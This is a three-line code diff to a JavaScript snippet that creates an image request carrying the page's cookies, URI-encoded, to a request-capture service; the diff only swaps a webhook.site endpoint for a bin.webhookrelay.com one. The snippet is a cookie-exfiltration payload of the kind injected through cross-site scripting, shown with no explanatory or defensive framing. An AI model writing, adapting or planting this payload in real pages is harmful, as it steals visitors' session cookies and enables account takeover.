@@ -1,3 +1,3 @@
 new Image().src =
-"http://webhook.site/0212a0e0-8f6d-4b53-861a-90063da59c46?test="
+"https://bin.webhookrelay.com/v1/webhooks/0e65490e-7f29-48c5-ab1c-517a1b280498?data="
 + encodeURIComponent(document.cookie);
